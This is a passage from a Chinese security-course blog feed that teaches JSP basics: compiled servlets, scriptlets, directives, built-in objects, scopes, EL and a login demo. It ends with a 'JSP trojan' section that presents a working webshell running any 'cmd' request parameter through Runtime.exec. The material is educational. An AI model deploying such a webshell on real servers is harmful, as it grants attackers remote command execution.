class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><br><span class="hljs-comment"> * Version: Apache Tomcat/9.0.78</span><br><span class="hljs-comment"> * Generated at: 2023-07-21 12:09:36 UTC</span><br><span class="hljs-comment"> * Note: The last modified time of this file was set to</span><br><span class="hljs-comment"> *       the last modified time of the source file after</span><br><span class="hljs-comment"> *       generation to assist with modification tracking.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> org.apache.jsp;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.jsp.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">index_jsp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.HttpJspBase<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.JspSourceDependent,<br>                 org.apache.jasper.runtime.JspSourceImports &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.<span class="hljs-type">JspFactory</span> <span class="hljs-variable">_jspxFactory</span> <span class="hljs-operator">=</span><br>          javax.servlet.jsp.JspFactory.getDefaultFactory();<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>    _jspx_imports_packages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.HashSet&lt;&gt;();<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);<br>    _jspx_imports_classes = <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;<br><br>  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_dependants;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_packages;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_classes;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory <span class="hljs-title function_">_jsp_getExpressionFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _el_expressionfactory;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager <span class="hljs-title function_">_jsp_getInstanceManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _jsp_instancemanager;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspInit</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspDestroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspService</span><span class="hljs-params">(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;<br><br>    <span class="hljs-keyword">if</span> (!javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;<br>      <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">_jspx_method</span> <span class="hljs-operator">=</span> request.getMethod();<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPTIONS&quot;</span>.equals(_jspx_method)) &#123;<br>        response.setHeader(<span class="hljs-string">&quot;Allow&quot;</span>,<span class="hljs-string">&quot;GET, HEAD, POST, OPTIONS&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method)) &#123;<br>        response.setHeader(<span class="hljs-string">&quot;Allow&quot;</span>,<span class="hljs-string">&quot;GET, HEAD, POST, OPTIONS&quot;</span>);<br>        response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// jsp 内置对象</span><br>    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;<br>    javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// jsp 中代码转换为相应 java 代码</span><br>    <span class="hljs-keyword">try</span> &#123;<br>      response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>      pageContext = _jspxFactory.getPageContext(<span class="hljs-built_in">this</span>, request, response,<br>      <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-literal">true</span>);<br>      _jspx_page_context = pageContext;<br>      application = pageContext.getServletContext();<br>      config = pageContext.getServletConfig();<br>      session = pageContext.getSession();<br>      out = pageContext.getOut();<br>      _jspx_out = out;<br><br>      out.write(<span class="hljs-string">&quot;&lt;html&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;body&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;h2&gt;Hello World!&lt;/h2&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;/body&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;/html&gt;\r\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;<br>      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;<br>        out = _jspx_out;<br>        <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br>              out.flush();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              out.clearBuffer();<br>            &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;<br>        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-literal">null</span>) _jspx_page_context.handlePageException(t);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(t);<br>      &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      _jspxFactory.releasePageContext(_jspx_page_context);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>index_jsp.java 继承于 HttpJspBase 类，HttpJspBase 是一个实现了 HttpJspPage 接口并继承了 HttpServlet 的标准的Servlet，jspService 方法其实是 HttpJspPage 接口方法，类似于 Servlet 中的 service 方法，这里的 _jspService方法其实就是HttpJspBase的service方法调用。</p><h2 id="3、JSP脚本"><a href="#3、JSP脚本" class="headerlink" title="3、JSP脚本"></a>3、JSP脚本</h2><p>JSP 脚本就是 JSP 页面中的 java 代码，也叫做scriptlet。JSP 的脚本必须使用<code>&lt;% %&gt;</code>括起来，不然会将当成是模板数据即当做 HTMl 代码进行解析</p><p>JSP脚本存在以下三种方式</p><ul><li>&lt;%%&gt;定义局部变量，编写语句，可用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>替代</li><li>&lt;%!%&gt;   定义类或方法(极少使用)</li><li>&lt;%&#x3D;%&gt; 输出各种类型的变量，int、double、String、Object等， 也称为表达式输出</li></ul><h2 id="4、JSP指令"><a href="#4、JSP指令" class="headerlink" title="4、JSP指令"></a>4、JSP指令</h2><h3 id="4-1、"><a href="#4-1、" class="headerlink" title="4.1、&lt;%@ page … %&gt;"></a>4.1、&lt;%@ page … %&gt;</h3><p>定义网页依赖属性，比如脚本语言、error页面、缓存需求等等</p><ul><li><p>session&#x3D;”true | false”          </p></li><li><p>errorPage&#x3D;”relative_url”              设置报错跳转页面，配合 isErrorPage 使用</p></li><li><p>isErrorPage&#x3D;”true | false”           设置页面是否为 isErrorPage</p></li><li><p>contentType&#x3D;”text&#x2F;html;charset&#x3D;UTF-8”</p></li><li><p>pageEncoding&#x3D;”characterSet “</p></li><li><p>isELIgnored&#x3D;”true | false”</p></li></ul><h3 id="4-2、"><a href="#4-2、" class="headerlink" title="4.2、&lt;%@ include … %&gt;"></a>4.2、&lt;%@ include … %&gt;</h3><p>包含其他文件（静态包含）</p><h3 id="4-3、"><a href="#4-3、" class="headerlink" title="4.3、&lt;%@ taglib … %&gt;"></a>4.3、&lt;%@ taglib … %&gt;</h3><p>引入标签库的定义，taglib指令就是用来指明JSP页面内使用标签库技术</p><h2 id="5、JSP内置对象"><a href="#5、JSP内置对象" class="headerlink" title="5、JSP内置对象"></a>5、JSP内置对象</h2><p>JSP存在以下九大内置对象</p><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面编译后的内容，可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table><h2 id="6、域对象"><a href="#6、域对象" class="headerlink" title="6、域对象"></a>6、域对象</h2><p>pageContext、request、session、ServletContext作为域对象均存在以下三个方法：</p><ul><li><p>setAttribute(String name,Objcet o)</p></li><li><p>getAttribute(String name)</p></li><li><p>removeAttribute(String name)</p></li></ul><p>pageContext 本质上代表的是当前JSP页面编译后的内容，作为域对象而言，仅代表当前 JSP 页面，即 pageContext 域对象只在 page 范围内有效，超出 page 范围将失效</p><p>同一 page 页面内使用</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;使用page域对象&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>  pageContext.setAttribute(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;baigeixinan&quot;</span>);<br>%&gt;<br>&lt;%<br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>);<br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可正常使用</p><p><img src="/image/image-20230721212519030.png" alt="image-20230721212519030"></p><p>尝试跨域获取</p><p>test2.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;request域对象设置属性&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>  <span class="hljs-comment">//这是request域对象保存的内容</span><br>  request.setAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;zhongfucheng&quot;</span>);<br>%&gt;<br><br>&lt;%--跳转test3.jsp--%&gt;<br>&lt;jsp:forward page=<span class="hljs-string">&quot;test3.jsp&quot;</span>/&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>test3.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%<br><br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>);<br><br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>获取失败</p><p><img src="/image/image-20230721212735618.png" alt="image-20230721212735618"></p><p>pageContext对象重载了setAttribute()、getAttribute()、removeAttribute()三个方法，添加了一个设置域范围的一个参数，如果不指定默认为 page</p><ul><li><p>getAttribute(String name,int scope)</p></li><li><p>setAttribute(String name,Object value,int scope)</p></li><li><p>removeAttribute(String name,int scope)</p></li></ul><p>pageContext把request、session、application、page这几个域对象封装着了静态变量供我们使用。</p><ul><li><p>PageContext.APPLICATION_SCOPE</p></li><li><p>PageContext.SESSION_SCOPE</p></li><li><p>PageContext.REQUEST_SCOPE</p></li><li><p>PageContext.PAGE_SCOPE</p></li></ul><p>修改 test3.jsp 如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%<br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>,pageContext.REQUEST_SCOPE);<br><br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可成功获取</p><p><img src="/image/image-20230721213441854.png" alt="image-20230721213441854"></p><p>4中属性范围如下：</p><ul><li><p>page【只在一个页面中保存属性，跳转页面无效】</p></li><li><p>requet【只在一次请求中保存属性，服务器跳转有效，浏览器跳转无效】</p></li><li><p>session【在一个会话范围中保存属性，无论何种跳转均有效，关闭浏览器后无效】</p></li><li><p>application【在整个服务器中保存，所有用户都可以使用】</p></li></ul><h2 id="7、EL表达式"><a href="#7、EL表达式" class="headerlink" title="7、EL表达式"></a>7、EL表达式</h2><p>表达式语言（Expression Language，EL）,EL表达式是用”${}”括起来的脚本，EL表达式主要用来读取数据，进行内容显示。</p><h2 id="8、JSP-demo"><a href="#8、JSP-demo" class="headerlink" title="8、JSP demo"></a>8、JSP demo</h2><p>login.html</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;登录页&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br> &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;<br>    &lt;h2&gt;登录&lt;/h2&gt;<br> <br>    &lt;form action=<span class="hljs-string">&quot;login.jsp&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        账号: &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>/&gt;&lt;br&gt;<br>        密码: &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>/&gt;&lt;br&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;登录&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span><br><span class="hljs-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>    &lt;title&gt;主页&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//模拟登录成功与否</span><br>    <span class="hljs-keyword">if</span>(username.equals(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; password.equals(<span class="hljs-string">&quot;123456&quot;</span>))&#123;<br>        response.getWriter().write(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        response.getWriter().write(<span class="hljs-string">&quot;登录失败&quot;</span>);<br>    &#125;<br>%&gt;<br><br>用户名：&lt;%= username%&gt; <br>密码：&lt;%= password%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="9、JSP木马"><a href="#9、JSP木马" class="headerlink" title="9、JSP木马"></a>9、JSP木马</h2><p>JSP木马也可以称作JSP Webshell，如果对方在上传文件或其他功能没有做防护的话，攻击者可以利用任意文件上传漏洞将恶意代码传到后端，继而攻击者可以达到操作目标网站的目的。</p><p>木马demo</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.nio.charset.Charset&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">retStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">char</span>[] tmpBuffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">nRet</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>    <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, Charset.forName(<span class="hljs-string">&quot;GB2312&quot;</span>));<br>    <span class="hljs-keyword">while</span> ((nRet = inputStreamReader.read(tmpBuffer, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)) != -<span class="hljs-number">1</span>) &#123;<br>        retStr += <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(tmpBuffer, <span class="hljs-number">0</span>, nRet);<br>    &#125;<br>    inputStreamReader.close();<br><br>%&gt;<br>&lt;%= retStr%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-Freemarker模板注入漏洞</title>
    <link href="/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
